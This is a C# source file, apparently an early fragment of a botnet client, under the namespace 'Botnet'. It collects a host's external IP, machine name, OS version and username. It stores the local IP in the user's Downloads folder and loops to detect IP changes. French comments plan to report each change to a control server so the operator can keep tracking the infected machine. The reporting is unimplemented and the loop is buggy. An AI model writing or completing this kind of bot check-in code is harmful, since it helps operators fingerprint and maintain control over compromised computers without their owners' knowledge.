using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Management;

namespace Botnet
{
    class Tools
    {

        public string ip = "";
        public string machine_name = "";
        public string os = "";
        public string user_session = "";
        public string bonjour = "";

        public Tools()
        {
            ip = GetIp();
            machine_name = System.Environment.MachineName.ToString();
            os = Environment.OSVersion.ToString();
            user_session = Environment.UserName.ToString();
            
            
        }

        public string GetIp()
        {
            try
            {
                string externalIP;
                externalIP = (new System.Net.WebClient()).DownloadString("http://checkip.dyndns.org/");
                externalIP = (new System.Text.RegularExpressions.Regex(@"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}")).Matches(externalIP)[0].ToString();
                return externalIP;
            }
            catch
            {
                return null;
            }
        }
		
		public string GetIPAddress()
        {
            string ip = null;

            string PCUsername = Environment.UserName;
            string chemin = "C:/users/" + PCUsername + "/Downloads/system_ip.txt";

            System.Net.IPHostEntry Host = default(IPHostEntry);
            string Hostname = null;
            Hostname = System.Environment.MachineName;
            Host = Dns.GetHostEntry(Hostname);
            foreach (IPAddress IP in Host.AddressList)
            {
                if (IP.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    ip = Convert.ToString(IP);
                    string lines = ip;
                    System.IO.File.WriteAllText(@chemin, lines);
                }
            }
            return ip;
        }


        public void CheckIP()
        {
            string PCUsername = Environment.UserName;
            string chemin = "C:/users/" + PCUsername + "/Downloads/system_ip.txt";

            string IPactu = File.ReadAllText(chemin);

            // Boucle infinie pour savoir si l@ IP de l'état précédent est tjrs la m que l'état actuelle
            bool letsgo = true;
            string IPprec = null;

            while (letsgo == true)
                {
                IPprec = IPactu;
                IPactu = GetIPAddress();

                if (IPactu != IPprec)
                    {
                    Console.WriteLine("L'ancienne adresse est: " + IPprec);
                    IPprec = IPactu;
                    // Envoie de l'ancienne adresse IP + la nouvelle IP + l'adresse MAC
                    Console.WriteLine("La nouvelle adresse est: " + IPactu);
                    Console.ReadKey();
                    // Send la nouvelle IP au serveur avec le nom, pour que côté serveur le script fasse matcher les deux
                }
                }
        }
        // Côté serveur cela devra faire le lien entre les différentes IP et l@ MAC du PC pour ne pas avoir de doublons
        
    }
}
